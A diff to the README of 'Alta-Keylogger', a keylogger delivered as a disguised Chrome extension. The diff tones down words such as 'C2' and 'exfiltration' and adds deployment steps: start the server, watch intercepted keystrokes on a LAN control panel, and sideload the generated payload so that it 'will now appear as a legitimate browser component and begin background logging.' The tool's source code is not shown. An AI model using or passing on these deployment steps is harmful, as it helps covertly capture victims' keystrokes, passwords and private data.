@@ -1,7 +1,7 @@
 # 🛡️ Alta-Keylogger
 
 
-### *Advanced Browser-Level Persistence & Data Exfiltration Framework*
+### *Advanced Browser-Level Persistence Keylogger*
 
 *(Replace the link above with your actual screenshot once uploaded to GitHub)*
 
@@ -9,9 +9,9 @@
 
 ## 📝 Description
 
-**Alta-Keylogger** is a sophisticated Red Team monitoring tool designed to demonstrate the risks of browser-based supply chain attacks. Unlike traditional executable loggers, this tool operates at the **browser level** using a hybrid architecture of **Python, Node.js, and JavaScript**.
+**Alta-Keylogger** is a sophisticated keylogger monitoring tool designed to demonstrate the risks of browser-based extensions attacks. Unlike traditional executable loggers, this tool operates at the **browser level** using a hybrid architecture of **Python, Node.js, and JavaScript**.
 
-The core payload is disguised as a legitimate-looking Chrome Extension. Once sideloaded, it utilizes stealth techniques to remain persistent and transmit intercepted keystrokes to a centralized command-and-control (C2) server.
+The core payload is disguised as a legitimate-looking Chrome Extension. Once sideloaded, it utilizes stealth techniques to remain persistent and transmit intercepted keystrokes to a node.js server.
 
 -----
 
@@ -28,7 +28,7 @@ The core payload is disguised as a legitimate-looking Chrome Extension. Once sid
 
 ## 👨‍💻 Developer
 
-  * **Owner/Creator:** [Muhammad Alwaz]
+  * **Creator:** [Muhammad Alwaz]
   
 
 -----
@@ -59,8 +59,22 @@ Start the C2 server and listener.
 ```bash
 python3 Start.py
 ```
+Upon startup, the terminal will generate a **LAN Access URL** (e.g., `http://192.168.0.196:3000`).
 
------
+### 3. Access the Control Panel
+* Open your web browser.
+* Navigate to the **LAN Access** link displayed in your terminal.
+* This is your **Control Panel** where you can monitor intercepted logs in real-time.
+
+### 4. Deploy the Payload
+The framework automatically generates a `payload.zip` file in the root directory. To deploy it:
+1.  Locate `payload.zip` in the `Alta-Keylogger` folder and extract it.
+2.  Open **Google Chrome** and navigate to `chrome://extensions/`.
+3.  Enable **Developer Mode** (toggle in the top right corner).
+4.  Click **Load unpacked** and select the extracted payload folder.
+5.  The extension will now appear as a legitimate browser component and begin background logging.
+
+---
 
 ## ⚠️ Ethical Disclosure & Warning
 
